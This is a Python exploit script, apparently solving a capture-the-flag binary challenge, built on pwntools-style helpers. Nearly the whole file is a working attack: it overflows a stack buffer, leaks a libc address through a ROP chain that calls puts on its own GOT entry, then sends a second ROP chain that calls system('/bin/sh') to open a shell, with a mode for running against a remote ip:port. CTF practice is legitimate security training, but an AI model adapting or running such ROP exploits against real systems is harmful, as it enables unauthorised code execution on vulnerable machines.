#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

pop_rdi_ret = 0x0000000000401256

ru(b"Welcome! Press 1 to start the chall.\n")
sl(i2b(1))
ru(b"Select the len: ")
sl(i2b(0x8000))

debugB()

payload = b"a" * 0x38
payload += flat(
    [
        pop_rdi_ret,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.game,
    ]
)
payload = payload.ljust(0x820, b"\x00")
payload += flat(
    {
        0x10: [0x4040C0],
        0x28: b"a" * 8,
    }
)
s(payload)

libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base", libc_base)

s(b"\n")
payload = b"a" * 0x38
payload += flat(
    [
        pop_rdi_ret + 1,
        pop_rdi_ret,
        libc_base + next(libc.search(b"/bin/sh\x00")),
        libc_base + libc.sym.system,
    ]
)
s(payload)


ia()
